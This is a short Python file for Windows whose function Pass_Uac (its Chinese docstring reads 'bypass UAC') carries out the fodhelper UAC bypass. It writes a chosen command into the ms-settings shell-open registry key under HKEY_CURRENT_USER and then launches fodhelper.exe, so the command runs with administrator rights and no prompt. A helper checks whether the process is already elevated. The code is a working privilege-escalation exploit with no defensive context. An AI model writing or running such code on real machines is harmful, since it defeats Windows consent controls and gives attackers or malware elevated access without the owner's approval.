import sys
import os
import ctypes
import wincommon

if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg

CMD = wincommon.GetExePath("cmd")
FOD_HELPER = wincommon.GetExePath("fodhelper")
PYTHON_CMD = wincommon.GetExePath("python")
REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_admin():
    '''
    检查是否为管理员权限
    '''
    try:
        bRet = ctypes.windll.shell32.IsUserAnAdmin()
        if bRet:
            return True
        else:
            return False
    except:
        return False


def Pass_Uac(startinfo):
    '''
    绕过uac
    '''
    try:
        cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, startinfo)
        # winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        # registry_key = winreg.OpenKey(
        #     winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        # winreg.SetValueEx(registry_key, DELEGATE_EXEC_REG_KEY,
        #                   0, winreg.REG_SZ, '')
        # winreg.CloseKey(registry_key)

        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, None, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(registry_key)
        
        os.system(FOD_HELPER)
        sys.exit(0)
    except WindowsError:
        raise


if __name__ == '__main__':
    bRet = is_admin()
    print(str(bRet))